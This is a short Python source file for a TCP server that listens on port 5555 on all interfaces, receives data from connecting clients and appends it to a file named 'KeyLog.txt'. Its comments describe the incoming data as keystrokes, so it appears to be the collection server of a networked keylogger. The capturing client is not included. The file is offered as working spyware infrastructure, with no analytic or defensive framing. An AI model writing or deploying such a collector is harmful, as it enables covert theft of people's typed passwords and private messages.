import socket

# Server IP and Port
SERVER_IP = '0.0.0.0'  # Listen on all interfaces
SERVER_PORT = 5555

# Create a log file for keystrokes
log_file = 'KeyLog.txt'

# Start the server and listen for incoming connections
def start_server():
    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server_socket.bind((SERVER_IP, SERVER_PORT))
    server_socket.listen(5)
    print(f"Server listening on {SERVER_IP}:{SERVER_PORT}")

    while True:
        client_socket, client_address = server_socket.accept()
        print(f"Connection from {client_address}")

        with client_socket:
            while True:
                data = client_socket.recv(1024).decode()
                if not data:
                    break
                print(f"Received: {data}")
                log_keystroke(data)

# Function to log keystrokes to a file
def log_keystroke(data):
    with open(log_file, 'a') as log:
        log.write(data)

if __name__ == '__main__':
    start_server()
